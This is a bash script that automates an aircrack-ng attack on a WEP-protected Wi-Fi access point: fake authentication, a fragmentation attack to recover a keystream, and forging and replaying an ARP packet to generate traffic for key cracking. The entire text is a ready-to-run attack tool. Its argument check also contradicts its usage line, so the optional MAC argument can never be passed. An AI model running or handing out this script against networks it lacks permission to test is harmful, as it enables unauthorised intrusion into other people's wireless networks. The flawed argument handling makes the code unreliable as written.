#!/bin/bash
if [[ `whoami` != "root" ]]; then
    echo "Must be root to run this."
    exit 1
fi

if [[ $# -ne 2 ]]; then
    echo "usage: `basename $0` ap_mac interface our_mac"
    exit 1
fi

ap_mac=$1
iface=$2
our_mac=""

if [[ -z $3 ]]; then
    echo "No mac specified, use default."
    our_mac=`macchanger -s $iface | awk '{print $3}'`
    echo "Using $our_mac for host mac."
else
    our_mac=$3
fi

# try a fake auth first
echo
echo "++++++++++++++++++++++++++"
echo "+ Attempting a fake auth +"
echo "++++++++++++++++++++++++++"
echo
aireplay-ng -1 0 -a $ap_mac -h $our_mac $iface

if [[ $? -ne 0 ]]; then
    echo "Fake auth failed."
    exit 1
fi

# perform a fragment attack
echo
echo "+++++++++++++++++++++++++++++"
echo "+ Perform a fragment attack +"
echo "+++++++++++++++++++++++++++++"
echo
echo "y" | aireplay-ng -5 -b $ap_mac $iface

if [[ $? -ne 0 ]]; then
    echo "Fragment attack failed."
    exit 1
fi

# get the generated xor file
xor_file=`ls -latr *.xor | awk '{print $NF}'`

# create our arp packet
echo
echo "+++++++++++++++++++++++"
echo "+ Creating ARP packet +"
echo "+++++++++++++++++++++++"
echo
packetforge-ng -0 -a $ap_mac -h $our_mac -k 255.255.255.255 -l 255.255.255.255 -y $xor_file -w my.arp.request

echo
echo "++++++++++++++++++++++++"
echo "+ Replaying ARP packet +"
echo "++++++++++++++++++++++++"
echo
echo "y" | aireplay-ng -2 -r my.arp.request $iface